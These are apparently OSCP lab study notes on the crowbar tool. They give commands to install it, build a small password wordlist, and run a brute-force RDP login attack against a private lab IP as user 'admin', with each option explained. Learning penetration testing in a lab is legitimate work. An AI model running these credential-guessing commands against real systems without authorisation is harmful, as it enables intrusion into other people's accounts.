## crowbar

Network authentication cracking tool primarily intended to use SSH keys rather than passwords.

One of few tools that can reliably and efficiently perform RDP authentication attacks on Modern Windows clients.

### Remote Desktop Protocol Attack

1. Install crowbar

   ```bash
   sudo apt install crowbar
   ```

2. Generate a wordlist to use with it:

   ```bash
   echo hacker > password-file.txt
   echo password >> password-file.txt
   echo kali >> password-file.txt
   echo ilak >> password-file.txt
   echo lab >> password-file.txt
   ```

3. Run crowbar to initiate the attack
   NOTE:  We are using only 1 thread since RDP does not reliably handle multiple threads

   ```bash
   crowbar -b rdp -s 192.168.216.10/32 -u admin -C /home/coyote/oscplab/passwords/password-file.txt -n 1
   
   # Options
   -b rdp	# Specifies RDP protocol
   -s		# Target server
   -u		# Username
   -C		# Wordlist
   -n		# Number of threads
   ```
